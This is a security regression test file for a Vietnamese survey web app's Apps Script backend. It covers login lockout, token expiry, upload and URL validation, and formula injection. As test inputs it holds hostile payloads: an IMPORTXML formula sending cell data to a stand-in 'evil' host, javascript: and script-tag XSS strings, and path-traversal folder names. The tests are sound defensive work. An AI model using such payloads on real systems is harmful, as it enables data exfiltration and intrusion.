// tests/security.test.mjs — Bản vá bảo mật v2.2.1 (rà soát 09/11/2026).
// Mỗi test ứng với 1 lỗi đã chứng minh được; chạy trên Code.gs THẬT (verifyToken/can thật, crypto thật).
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { loadAuthGs, PASSWORDS } from './_auth-harness.mjs';
import { addSurveySheet, rowObj } from './_harness.mjs';

const HOUR = 3600e3, DAY = 24 * HOUR;
const DRIVE_URL = id => 'https://drive.google.com/uc?export=view&id=' + id;
const JPG_B64 = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2, 3]).toString('base64');

// ---------- K1: tự đặt lại mật khẩu không cần đăng nhập ----------
test('K1 reset_own_password bị tắt — không đổi được mật khẩu admin khi chưa đăng nhập', () => {
  const gs = loadAuthGs();
  const r = gs.post({ action: 'reset_own_password', username: 'admin', full_name: 'Quản Trị Viên', new_password: 'KeTanCong123' });
  assert.equal(r.ok, false);
  assert.equal(gs.post({ action: 'login', username: 'admin', password: 'KeTanCong123' }).ok, false);
  assert.equal(gs.login('admin').ok, true, 'mật khẩu cũ vẫn dùng được');
});

// ---------- K4: dò mật khẩu ----------
test('K4 sai 5 lần → khoá 5 phút, kể cả nhập đúng; hết 5 phút thì vào được', () => {
  const gs = loadAuthGs();
  for (let i = 0; i < 5; i++) assert.equal(gs.post({ action: 'login', username: 'admin', password: 'sai' + i }).ok, false);
  const locked = gs.login('admin');
  assert.equal(locked.ok, false);
  assert.match(locked.error, /khoá|thử lại/i);
  gs.clock.now += 5 * 60e3 + 1000;
  assert.equal(gs.login('admin').ok, true);
});

test('K4 đăng nhập đúng xoá bộ đếm; tên đăng nhập không tồn tại cũng bị đếm (không lộ user nào có thật)', () => {
  const gs = loadAuthGs();
  for (let i = 0; i < 4; i++) gs.post({ action: 'login', username: 'admin', password: 'sai' });
  assert.equal(gs.login('admin').ok, true);
  for (let i = 0; i < 4; i++) gs.post({ action: 'login', username: 'admin', password: 'sai' });
  assert.equal(gs.login('admin').ok, true, 'bộ đếm đã về 0 sau lần đúng');
  for (let i = 0; i < 5; i++) gs.post({ action: 'login', username: 'khongco', password: 'x' });
  const r = gs.post({ action: 'login', username: 'khongco', password: 'x' });
  assert.match(r.error, /khoá|thử lại/i);
  // Viết hoa/thường không lách được bộ đếm
  for (let i = 0; i < 5; i++) gs.post({ action: 'login', username: i % 2 ? 'ADMIN' : 'admin', password: 'sai' });
  assert.equal(gs.login('admin').ok, false);
});

// ---------- C5: token ----------
test('C5 refresh không nâng phiên 8 tiếng thành 1 năm', () => {
  const gs = loadAuthGs();
  const lg = gs.login('demo', { remember: false });
  const rf = gs.post({ action: 'refresh', token: lg.token, remember: true });
  assert.equal(rf.ok, true);
  assert.ok(rf.expires_at - gs.clock.now <= 8 * HOUR + 1000, 'hạn sau refresh ≤ 8 tiếng');
  assert.equal(rf.remember, false);
});

test('C5 phiên thường có hạn tuyệt đối 12 tiếng dù refresh liên tục', () => {
  const gs = loadAuthGs();
  let tok = gs.login('ktv01', { remember: false }).token;
  for (let i = 0; i < 4; i++) {
    gs.clock.now += 4 * HOUR;
    const r = gs.post({ action: 'refresh', token: tok });
    if (!r.ok) { assert.ok(i >= 2, 'bị chặn sau quá 12 tiếng'); return; }
    assert.ok(r.expires_at <= gs.clock.now - (i + 1) * 4 * HOUR + 12 * HOUR + 1000);
    tok = r.token;
  }
  assert.equal(gs.post({ action: 'list', token: tok, type: 'hkn' }).ok, false);
});

test('C5 phiên "ghi nhớ" có hạn tuyệt đối 1 năm tính từ lúc đăng nhập', () => {
  const gs = loadAuthGs();
  let tok = gs.login('ktv01', { remember: true }).token;
  gs.clock.now += 300 * DAY;
  const r = gs.post({ action: 'refresh', token: tok, remember: true });
  assert.equal(r.ok, true);
  assert.ok(r.expires_at <= gs.clock.now + 65 * DAY + 1000, 'không vượt 365 ngày kể từ đăng nhập');
});

test('C5 đổi mật khẩu → token cũ hết hiệu lực; admin reset mật khẩu → token cũ của người đó hết hiệu lực', () => {
  const gs = loadAuthGs();
  const t1 = gs.login('ktv01').token;
  const t2 = gs.login('ktv01').token;
  const ch = gs.post({ action: 'change_password', token: t1, current_password: PASSWORDS.ktv01, new_password: 'MoiDoi!2026' });
  assert.equal(ch.ok, true);
  assert.equal(gs.post({ action: 'refresh', token: t2 }).ok, false, 'phiên trên máy khác bị đăng xuất');
  assert.ok(ch.token, 'người vừa đổi nhận token mới để khỏi phải đăng nhập lại');
  assert.equal(gs.post({ action: 'refresh', token: ch.token }).ok, true);

  const tKtv = ch.token;
  const tAdmin = gs.login('admin').token;
  assert.equal(gs.post({ action: 'reset_password', token: tAdmin, username: 'ktv01', new_password: 'TamThoi!2026' }).ok, true);
  assert.equal(gs.post({ action: 'refresh', token: tKtv }).ok, false);
});

test('C5 token định dạng cũ (trước v2.2.1) bị từ chối — mọi người đăng nhập lại 1 lần', () => {
  const gs = loadAuthGs();
  const old = gs.run(`(() => { const exp = Date.now() + 3600e3; const p = 'admin|' + exp;
    return Utilities.base64EncodeWebSafe(p + '|' + hmacSha256Hex(p, getSalt())); })()`);
  assert.equal(gs.post({ action: 'refresh', token: old }).ok, false);
});

test('C5 must_change chặn ở máy chủ: chỉ được đổi mật khẩu/refresh', () => {
  const gs = loadAuthGs();
  gs.run(`setPassword('ktv01', 'TamThoi!2026', true)`);
  const lg = gs.post({ action: 'login', username: 'ktv01', password: 'TamThoi!2026' });
  assert.equal(lg.ok, true);
  assert.equal(lg.must_change, true);
  addSurveySheet(gs, 'hkn');
  assert.equal(gs.post({ action: 'submit', token: lg.token, type: 'hkn', data: {} }).ok, false);
  assert.equal(gs.post({ action: 'list', token: lg.token, type: 'hkn' }).ok, false);
  assert.equal(gs.post({ action: 'refresh', token: lg.token }).ok, true);
  const ch = gs.post({ action: 'change_password', token: lg.token, current_password: 'TamThoi!2026', new_password: 'CuaToi!2026' });
  assert.equal(ch.ok, true);
  assert.equal(gs.post({ action: 'list', token: ch.token, type: 'hkn' }).ok, true);
});

test('lỗi trả về không kèm stack trace', () => {
  const gs = loadAuthGs();
  const r = gs.post({ action: 'list', token: 'rac' });
  assert.equal(r.ok, false);
  assert.equal(r.stack, undefined);
});

// ---------- K2: photo_base64 ----------
test('K2 photo_base64 chỉ đọc ẢNH nằm trong thư mục gốc của app', () => {
  const gs = loadAuthGs();
  gs.drive.addFolder('ROOT/khaosat', 'ROOT');
  gs.drive.addFile('ANH_OK', { parent: 'ROOT/khaosat' });
  gs.drive.addFile('FILE_SHEETS', { mime: 'application/vnd.google-apps.spreadsheet', parent: 'OUTSIDE' });
  gs.drive.addFile('ANH_NGOAI', { parent: 'OUTSIDE' });
  gs.drive.addFile('PDF_TRONG', { mime: 'application/pdf', parent: 'ROOT' });
  const tok = gs.login('ktv01').token;

  for (const id of ['FILE_SHEETS', 'ANH_NGOAI', 'PDF_TRONG', 'KHONG_TON_TAI']) {
    assert.equal(gs.post({ action: 'photo_base64', token: tok, url: DRIVE_URL(id) }).ok, false, id);
  }
  assert.deepEqual(gs.drive.read, [], 'không đọc nội dung file nào ngoài phạm vi');
  assert.deepEqual(gs.fetched, [], 'không đi đường HTTP dự phòng');
  assert.equal(gs.post({ action: 'photo_base64', token: tok, url: DRIVE_URL('ANH_OK') }).ok, true);
});

test('K2 tài khoản demo không gọi được photo_base64', () => {
  const gs = loadAuthGs();
  gs.drive.addFile('ANH_OK', { parent: 'ROOT' });
  const tok = gs.login('demo').token;
  assert.equal(gs.post({ action: 'photo_base64', token: tok, url: DRIVE_URL('ANH_OK') }).ok, false);
});

// ---------- C6: upload_photo ----------
test('C6 upload_photo: demo bị chặn; chỉ nhận ảnh jpeg/png; chỉ thư mục cho phép; giới hạn dung lượng', () => {
  const gs = loadAuthGs();
  const demo = gs.login('demo').token;
  const ktv = gs.login('ktv01').token;
  const up = (token, extra) => gs.post({ action: 'upload_photo', token, base64: JPG_B64, mimeType: 'image/jpeg', fileName: 'a.jpg', folder: 'khaosat/thay_den', ...extra });

  assert.equal(up(demo).ok, false, 'demo');
  assert.equal(up(ktv, { mimeType: 'text/html', fileName: 'x.html' }).ok, false, 'html');
  assert.equal(up(ktv, { mimeType: 'application/pdf' }).ok, false, 'pdf');
  for (const folder of ['../x', 'khaosat/../../x', 'Tai lieu rieng', '', 'khaosat/thay_den/a/b/c']) {
    assert.equal(up(ktv, { folder }).ok, false, 'folder ' + folder);
  }
  const big = Buffer.alloc(11 * 1024 * 1024, 1).toString('base64');
  assert.equal(up(ktv, { base64: big }).ok, false, 'quá 10 MB');
  assert.equal(gs.drive.created.length, 0, 'không tạo file nào ở các ca xấu');

  for (const folder of ['khaosat/thay_den', 'khaosat/banve/thay_den', 'Bangron']) {
    const r = up(ktv, { folder });
    assert.equal(r.ok, true, folder + ' ' + r.error);
  }
  const r = up(ktv, { mimeType: 'image/png', fileName: '<script>.png' });
  assert.equal(r.ok, true);
  assert.doesNotMatch(gs.drive.created.at(-1).name, /[<>]/, 'tên file được làm sạch');
});

// ---------- K3: URL ảnh do client khai ----------
test('K3 submit/update chỉ nhận URL ảnh Drive/Cloudinary của app', () => {
  const gs = loadAuthGs();
  const sh = addSurveySheet(gs, 'thay_den');
  const tok = gs.login('ktv01').token;
  const bad = ['javascript:alert(1)', 'https://evil.example/a.jpg', DRIVE_URL('x') + '"><script>',
               'https://res.cloudinary.com/cloudkhac/image/upload/v1/khaosat/a.jpg', 'http://drive.google.com/uc?export=view&id=abc'];
  for (const u of bad) {
    const r = gs.post({ action: 'submit', token: tok, type: 'thay_den', data: { 'Tuyến đường': 'X' }, photos: [u] });
    assert.equal(r.ok, false, u);
  }
  assert.equal(sh._d.length, 1, 'không ghi dòng nào');
  const good = [DRIVE_URL('AbC_12-x'), 'https://res.cloudinary.com/dmlsqbe8c/image/upload/v17/khaosat/thay_den/abc.jpg'];
  const r = gs.post({ action: 'submit', token: tok, type: 'thay_den', data: { 'Tuyến đường': 'X' }, photos: good });
  assert.equal(r.ok, true, r.error);

  const admin = gs.login('admin').token;
  const stt = rowObj(sh, 2)['STT'];
  assert.equal(gs.post({ action: 'update', token: admin, type: 'thay_den', stt, data: {}, photos: ['javascript:alert(1)'] }).ok, false);
  // Trường ảnh đơn (Bản vẽ) cũng phải đúng mẫu
  assert.equal(gs.post({ action: 'submit', token: tok, type: 'thay_den', data: { 'Bản vẽ': 'javascript:alert(1)' }, photos: [] }).ok, false);
});

test('K3 xoá bản ghi chỉ chuyển vào thùng rác ảnh nằm trong thư mục app', () => {
  const gs = loadAuthGs();
  gs.drive.addFile('ANH_APP', { parent: 'ROOT' });
  gs.drive.addFile('FILE_SHEETS', { mime: 'application/vnd.google-apps.spreadsheet', parent: 'OUTSIDE' });
  gs.drive.addFile('ANH_NGOAI', { parent: 'OUTSIDE' });
  addSurveySheet(gs, 'thay_den', [{
    STT: 'TD-1',
    'Ảnh (URLs)': [DRIVE_URL('ANH_APP'), DRIVE_URL('FILE_SHEETS'), DRIVE_URL('ANH_NGOAI'),
                   'https://res.cloudinary.com/cloudkhac/image/upload/v1/x/y.jpg'].join('|')
  }]);
  const admin = gs.login('admin').token;
  const r = gs.post({ action: 'delete', token: admin, type: 'thay_den', stt: 'TD-1' });
  assert.equal(r.ok, true, r.error);
  assert.deepEqual([...gs.drive.trashed], ['ANH_APP']);
  assert.deepEqual(gs.fetched.filter(u => /cloudinary/.test(u)), [], 'không gọi destroy cho cloud khác');
});

// ---------- Chèn công thức vào Sheets ----------
test('chuỗi bắt đầu bằng = + @ được ghi dạng chữ; số âm vẫn là số', () => {
  const gs = loadAuthGs();
  const sh = addSurveySheet(gs, 'thay_den');
  const tok = gs.login('ktv01').token;
  const r = gs.post({ action: 'submit', token: tok, type: 'thay_den', photos: [],
    data: { 'Tuyến đường': '=IMPORTXML("https://evil/?"&A1,"//a")', 'Ghi chú': '@SUM(1)', 'Đầu tuyến': '+84 909', 'Số đèn hiện hữu': '-5' } });
  assert.equal(r.ok, true, r.error);
  const row = rowObj(sh, 2);
  assert.equal(row['Tuyến đường'], "'=IMPORTXML(\"https://evil/?\"&A1,\"//a\")");
  assert.equal(row['Ghi chú'], "'@SUM(1)");
  assert.equal(row['Đầu tuyến'], "'+84 909");
  assert.equal(String(row['Số đèn hiện hữu']), '-5');
});

test('K3 sửa bản ghi cũ có URL ảnh định dạng lạ: giữ nguyên được, thêm URL lạ mới thì bị chặn', () => {
  const gs = loadAuthGs();
  const legacy = 'https://drive.google.com/file/d/LEGACY_ID_123/view';
  addSurveySheet(gs, 'thay_den', [{ STT: 'TD-9', 'Ảnh (URLs)': legacy, 'Bản vẽ': legacy }]);
  const admin = gs.login('admin').token;
  const ok = gs.post({ action: 'update', token: admin, type: 'thay_den', stt: 'TD-9',
    data: { 'Ghi chú': 'sửa', 'Bản vẽ': legacy }, photos: [legacy, DRIVE_URL('MOI_1')] });
  assert.equal(ok.ok, true, ok.error);
  const bad = gs.post({ action: 'update', token: admin, type: 'thay_den', stt: 'TD-9',
    data: {}, photos: [legacy, 'https://drive.google.com/file/d/KHAC/view'] });
  assert.equal(bad.ok, false);
});

// ---------- Vòng duyệt 1 (chuyên gia bảo mật) ----------
test('R1 cột User Agent cũng được chống chèn công thức', () => {
  const gs = loadAuthGs();
  const sh = addSurveySheet(gs, 'thay_den');
  const tok = gs.login('ktv01').token;
  assert.equal(gs.post({ action: 'submit', token: tok, type: 'thay_den', photos: [], data: {}, ua: '=IMPORTXML("https://x","//a")' }).ok, true);
  assert.match(String(rowObj(sh, 2)['User Agent']), /^'=/);
});

test('R1 Cloudinary: chỉ nhận thư mục của app (khaosat/, Bangron/)', () => {
  const gs = loadAuthGs();
  addSurveySheet(gs, 'thay_den');
  const tok = gs.login('ktv01').token;
  const sub = u => gs.post({ action: 'submit', token: tok, type: 'thay_den', data: {}, photos: [u] }).ok;
  assert.equal(sub('https://res.cloudinary.com/dmlsqbe8c/image/upload/v1/other_app/logo.png'), false);
  assert.equal(sub('https://res.cloudinary.com/dmlsqbe8c/image/upload/v1/khaosat/../other/x.png'), false);
  assert.equal(sub('https://res.cloudinary.com/dmlsqbe8c/image/upload/v1/Bangron/abc.jpg'), true);
  gs.props.CLOUDINARY_CLOUD_NAME = 'lavipco';
  assert.equal(sub('https://res.cloudinary.com/dmlsqbe8c/image/upload/v1/khaosat/thay_den/a.jpg'), true, 'vẫn nhận cloud mặc định của frontend');
  assert.equal(sub('https://res.cloudinary.com/lavipco/image/upload/khaosat/thay_den/a.jpg'), true);
});

test('R1 chống chèn công thức khi có khoảng trắng/BOM/xuống dòng đứng trước', () => {
  const gs = loadAuthGs();
  for (const v of [' =1+1', '\n=1', '﻿=1+1', '\t@x']) assert.equal(gs.sanitizeCell(v)[0], "'", JSON.stringify(v));
  for (const v of ['-5', '-0.5', 'Đường A', '12/3', 5, true]) assert.equal(gs.sanitizeCell(v), v, JSON.stringify(v));
});

test('R1 đổi mật khẩu cũng bị giới hạn 5 lần thử mật khẩu hiện tại', () => {
  const gs = loadAuthGs();
  const tok = gs.login('ktv01').token;
  for (let i = 0; i < 5; i++) gs.post({ action: 'change_password', token: tok, current_password: 'sai' + i, new_password: 'MoiMoi!2026' });
  const r = gs.post({ action: 'change_password', token: tok, current_password: PASSWORDS.ktv01, new_password: 'MoiMoi!2026' });
  assert.equal(r.ok, false);
  assert.match(r.error, /thử lại/i);
});

test('R1 bị khoá đăng nhập → ghi Audit đúng 1 lần', () => {
  const gs = loadAuthGs();
  for (let i = 0; i < 8; i++) gs.post({ action: 'login', username: 'admin', password: 'sai' });
  assert.equal(gs.audit.filter(a => a[0] === 'login_locked').length, 1);
});

// ---------- Vòng duyệt QA ----------
test('QA máy chủ bận (khoá script đang bị giữ) vẫn đăng nhập được', () => {
  const gs = loadAuthGs();
  gs.LockService.getScriptLock = () => ({ waitLock() { throw new Error('Lock timeout'); }, releaseLock() { throw new Error('không được gọi'); } });
  const r = gs.login('admin');
  assert.equal(r.ok, true, r.error);
});

test('QA ghi chú bắt đầu bằng "- " không bị thêm dấu nháy', () => {
  const gs = loadAuthGs();
  assert.equal(gs.sanitizeCell('- đèn hư'), '- đèn hư');
  assert.equal(gs.sanitizeCell('-A1+1'), "'-A1+1");
});
